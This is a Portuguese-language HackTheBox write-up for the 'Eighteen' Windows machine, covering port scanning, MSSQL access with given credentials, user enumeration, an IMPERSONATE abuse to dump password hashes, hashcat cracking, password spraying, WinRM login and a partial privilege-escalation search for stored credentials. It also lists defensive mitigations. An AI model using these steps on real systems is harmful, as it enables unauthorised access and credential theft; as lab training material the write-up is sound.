---
description: CTF HackTheBox - Easy
---

# Eighteen

### 1. Escopo e Objetivo

* Máquina alvo: `10.129.135.29`&#x20;
* DNS: `eighteen.htb`  e `dc01.eighteen.htb`
* Objetivo: Obter as _flags_ `user.txt` e `root.txt`.
* Metodologia: Reconhecimento $$\rightarrow$$ Enumeração $$\rightarrow$$ Acesso Inicial $$\rightarrow$$ Escalada de Privilégio.

***

### 2. Reconhecimento e Enumeração Inicial

O alvo é um sistema operacional Windows com serviços HTTP (80), MSSQL (1433) e WinRM (5985) ativos.

#### 2.1. Varredura de Portas e Serviços

O _scan_ rápido com `rustscan` em conjunto com `nmap` com detecção de versão (`-sVC`).

```shellscript
# Varredura inicial de portas abertas
rustscan -a $IP -- -sVC -oN versionPorts.txt
```

<figure><img src="../../../.gitbook/assets/Pasted image 20251118062805 1.png" alt=""><figcaption></figcaption></figure>

* Serviços Chave: MS SQL Server 2022 RTM na porta 1433, indicando potencial vetor de ataque a banco de dados.

<figure><img src="../../../.gitbook/assets/Pasted image 20251118062818.png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/Pasted image 20251118062931.png" alt=""><figcaption></figcaption></figure>

#### 2.2. Enumeração Web e Credenciais Iniciais

A conta inicial (`kevin:iNa2we6haRj2gaw!`) não concedeu acesso privilegiado à rota `/admin` no serviço Web. A criação de um usuário via `/register` validou a funcionalidade da aplicação.

<figure><img src="../../../.gitbook/assets/Pasted image 20251118063835 (1).png" alt=""><figcaption></figcaption></figure>

*   DNS Descobertos: `eighteen.htb` e `dc01.eighteen.htb`  via nmap.

    ```shellscript
    echo "$IP eighteen.htb dc01.eighteen.htb" | sudo tee -a /etc/hosts
    ```

    <figure><img src="../../../.gitbook/assets/Pasted image 20251118064627 (2).png" alt=""><figcaption></figcaption></figure>

### 3. Exploração do MSSQL (Porta 1433) e Acesso Inicial

A credencial inicial (`kevin:iNa2we6haRj2gaw!`) foi validada para autenticação no serviço MSSQL.

#### 3.1. Conexão e Enumeração de Usuários (AD/SAMR)

A conexão com `impacket-mssqlclient` confirmou o acesso ao DB. O NetExec foi usado para realizar _RID-bruting_ (Enumeração de usuários via SID/RID) contra o sistema operacional através das credenciais SQL.

```shellscript
# Conexão inicial e verificação de privilégios
impacket-mssqlclient 'kevin:iNa2we6haRj2gaw!@eighteen.htb'
```

<figure><img src="../../../.gitbook/assets/Pasted image 20251118065240 (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/Pasted image 20251118070055 (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/Pasted image 20251118070335 (1).png" alt=""><figcaption></figcaption></figure>

```shellscript
# Enumeração de usuários (RID Brute) via NetExec
nxc mssql eighteen.htb -u kevin -p 'iNa2we6haRj2gaw!' --local-auth --rid-brute
```

<figure><img src="../../../.gitbook/assets/Pasted image 20251118065229.png" alt=""><figcaption></figcaption></figure>

* Usuários Enumerados: `jamie.dunn`, `jane.smith`, `alice.jones`, `adam.scott`, `bob.brown`, `carol.white`, `dave.green`, etc.

#### 3.2. Escalonamento de Privilégios no SQL Server (IMPERSONATE)

O usuário `kevin` não possuía acesso direto ao DB `financial_planner`. Foi realizada uma busca por privilégios de personificação (`IMPERSONATE`).

```sql
-- Identificação de usuários que podem ser personificados
SELECT distinct b.name FROM sys.server_permissions a 
INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id 
WHERE a.permission_name = 'IMPERSONATE'
```

<figure><img src="../../../.gitbook/assets/Pasted image 20251118070508 (1).png" alt=""><figcaption></figcaption></figure>

A personificação do usuário `appdev` (possivelmente a conta de serviço da aplicação) foi executada, concedendo acesso de leitura ao DB e a permissão para extrair dados da tabela `users`.

```sql
-- Execução da personificação e dump do hash
EXECUTE AS USER = 'appdev';
USE financial_planner;
SELECT * FROM users; 
```

<figure><img src="../../../.gitbook/assets/Pasted image 20251118070857 (1).png" alt=""><figcaption></figcaption></figure>

### 4. Quebra de Hash (Hashcat) e Acesso ao Sistema Operacional

#### 4.1. Cracking do Hash PBKDF2:SHA256

O hash foi formatado para o modo Hashcat 10900 (PBKDF2-HMAC-SHA256, MSSQL 2012+), exigindo a concatenação e recodificação dos componentes _salt_ e _hash_ em Base64, separados por `:` ou formato similar dependendo da versão do Hashcat.

<figure><img src="../../../.gitbook/assets/Pasted image 20251118071811 (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/Pasted image 20251118071607 (1).png" alt=""><figcaption></figcaption></figure>

```shellscript
# Comando de quebra de senha
hashcat -m 10900 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```

<figure><img src="../../../.gitbook/assets/Pasted image 20251118072113 (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/Pasted image 20251118072259 (1).png" alt=""><figcaption></figcaption></figure>

#### 4.2. Acesso ao Sistema Operacional (WinRM)

A senha quebrada (`iloveyou1`) foi utilizada em um _password spray_ contra os usuários enumerados, obtendo sucesso no login via WinRM (5985) com o usuário `adam.scott`.

<figure><img src="../../../.gitbook/assets/Pasted image 20251118073016 (1).png" alt=""><figcaption></figcaption></figure>

```shellscript
# Acesso remoto via WinRM
evil-winrm -i eighteen.htb -u adam.scott -p 'iloveyou1'
```

<figure><img src="../../../.gitbook/assets/Pasted image 20251118073123 (1).png" alt=""><figcaption></figcaption></figure>

### 5. Escalada de Privilégios (Privesc)

Apesar da execução das ferramentas de enumeração (`WinPEAS.exe`, BloodHound/Sharphound), os vetores de escalonamento padrão (serviços inseguros, permissões de arquivo, _unquoted service paths_) não foram imediatamente aparentes. A investigação foi focada em credenciais armazenadas e configurações de sistema.

<figure><img src="../../../.gitbook/assets/Pasted image 20251118113024 (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/Pasted image 20251118122255 (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/Pasted image 20251118123303 (2).png" alt=""><figcaption></figcaption></figure>

#### 5.1. Análise de Credenciais e Arquivos de Configuração

Em ambientes Windows, senhas ou _tokens_ de sessão frequentemente são armazenados em locais acessíveis ao usuário, como arquivos de configuração de aplicativos ou gerenciador de credenciais.

A investigação focou nos diretórios de usuário e configurações de rede:

1.  Enumerar Credenciais:

    ```powershell
    cmdkey /list
    Get-ChildItem -Path C:\Users\adam.scott -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern "password", "key", "token"
    ```
2. Verificar Diretórios de Aplicação: A máquina utiliza MSSQL e um _web app_. Foi verificado o diretório do serviço IIS ou do próprio SQL Server.



***

### 6. Lições Aprendidas e Boas Práticas

#### 6.1. Técnicas Chave

* Escalonamento em DB: O privilégio `IMPERSONATE` no MSSQL é um vetor crítico para personificar contas de serviço e realizar _hash dumping_ do DB.
* Reuso de Senha: A exploração se baseou no reuso de uma senha fraca (`iloveyou1`) para autenticação de sistema (`WinRM`) por outro usuário (via _password spray_).
* Investigação Pós-PEAS: Quando o `WinPEAS` falha em revelar vetores óbvios, a investigação deve focar em arquivos de configuração, vulnerabilidades recentes (CVEs), credenciais embutidas (_plaintext_) e _scripts_ de inicialização.

#### 6.2. Mitigações para Defender

* Princípio do Mínimo Privilégio: Contas de serviço (como `appdev`) não devem ter permissão de `IMPERSONATE` por _logins_ de usuários de baixo privilégio.
* Força da Senha e Rotação: Uso de _hash_ de senha seguro (PBKDF2) é inútil se a senha (PSK) for fraca e facilmente quebrável via _wordlist_. Implementar políticas de senhas complexas e rotação.
* Credenciais Armazenadas: Nunca armazenar senhas de administrador em _scripts_ ou arquivos de configuração que sejam acessíveis por usuários de baixo privilégio.
